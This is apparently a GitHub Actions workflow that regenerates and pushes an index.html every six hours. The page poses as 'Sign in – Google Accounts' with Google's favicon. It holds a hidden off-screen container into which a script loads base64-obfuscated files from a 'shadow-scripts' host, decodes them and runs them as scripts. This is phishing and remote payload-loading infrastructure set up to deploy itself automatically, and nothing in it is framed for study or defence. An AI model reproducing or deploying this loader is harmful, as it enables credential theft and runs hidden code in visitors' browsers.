name: 🔁 Auto-update Index Loader

on:
  push:
    paths:
      - 'obfuscated/*.b64'
  schedule:
    - cron: "0 */6 * * *" # every 6 hours
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest

    steps:
      - name: 📥 Checkout
        uses: actions/checkout@v3

      - name: 🛠 Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: 18

      - name: 🔁 Generate index.html loader
        run: |
          echo '<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in – Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
  <style>
    body {
      margin: 0;
      background: #fff;
      font-family: "Roboto", sans-serif;
    }
    .hidden-loader {
      position: fixed;
      top: -9999px;
      left: -9999px;
      visibility: hidden;
    }
  </style>
</head>
<body>
  <div class="hidden-loader" id="injector"></div>
  <script>
    const spoofTargets = [' > index.html

          find obfuscated/ -name "*.b64" | sed 's|obfuscated/||g' | sed "s/.*/  \"&\",/" >> index.html

          echo '    ];
    const cdnBase = "https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
    spoofTargets.forEach(async (file) => {
      try {
        const res = await fetch(cdnBase + file);
        const encoded = await res.text();
        const decoded = atob(encoded);
        const script = document.createElement("script");
        script.textContent = decoded;
        document.getElementById("injector").appendChild(script);
        console.log(`[✓] Injected: ${file}`);
      } catch (e) {
        console.error(`[✗] Failed: ${file}`, e);
      }
    });
  </script>
</body>
</html>' >> index.html

      - name: 📤 Commit & Push
        run: |
          git config user.name "popdeuxrem"
          git config user.email "174709939+popdeuxrem@users.noreply.github.com"
          git add index.html
          git diff --cached --quiet || git commit -m "🔁 Auto-update index.html [skip ci]"
          git push
